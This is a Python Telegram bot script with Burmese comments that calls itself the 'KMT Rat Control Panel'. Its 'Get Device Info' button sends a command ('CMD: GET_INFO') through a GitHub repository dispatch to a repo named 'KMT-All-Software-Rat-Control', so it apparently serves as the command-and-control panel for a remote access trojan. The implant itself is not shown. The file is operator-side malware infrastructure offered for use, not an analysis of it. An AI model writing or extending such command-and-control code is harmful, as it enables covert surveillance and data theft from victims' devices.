import os
import telebot
import requests

TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(TOKEN)

# GitHub Repository အချက်အလက်များ
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
REPO_OWNER = "qqq1234ttttt"
REPO_NAME = "KMT-All-Software-Rat-Control"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup()
    btn_device = telebot.types.InlineKeyboardButton("📱 Get Device Info", callback_data="get_device")
    markup.add(btn_device)
    bot.send_message(message.chat.id, "KMT Rat Control Panel - အောက်ပါခလုတ်ကို နှိပ်ပါ:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "get_device":
        # GitHub Actions သို့ Signal ပို့ရန် (Repository Dispatch)
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/dispatches"
        headers = {
            "Authorization": f"Bearer {GITHUB_TOKEN}",
            "Accept": "application/vnd.github+json"
        }
        data = {"event_type": "update_command", "client_payload": {"cmd": "CMD: GET_INFO"}}
        
        res = requests.post(url, headers=headers, json=data)
        if res.status_code == 204:
            bot.answer_callback_query(call.id, "Command Sent!")
            bot.send_message(call.message.chat.id, "📱 Device Info တောင်းဆိုသည့် အမိန့်ကို GitHub သို့ ပို့ပြီးပါပြီ။")
        else:
            bot.answer_callback_query(call.id, "Failed to send command.")

if __name__ == "__main__":
    bot.infinity_polling()
